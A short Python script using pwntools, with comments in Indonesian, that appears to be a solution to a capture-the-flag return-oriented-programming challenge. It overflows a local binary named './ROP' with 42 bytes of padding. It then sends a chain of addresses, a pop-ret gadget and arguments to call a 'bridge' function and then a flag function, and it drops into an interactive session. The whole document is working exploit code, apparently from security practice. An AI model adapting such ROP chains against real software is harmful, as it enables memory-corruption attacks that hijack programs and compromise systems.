from pwn import *
p = process('./ROP')
payload = b'a' * 42 + p32(0x8049282) + p32(0x804901e) + p32(0) + p32(0x8049196) + p32(0x0) + p32(100) + p32(0x8DB1FCB0)
# padding -> address dari bridge -> gadget pop ret; -> parameter bridge -> address flag -> value random -> parameter 1 -> parameter 2
p.sendline(payload) # send payload
p.interactive() # Masuk mode interaktif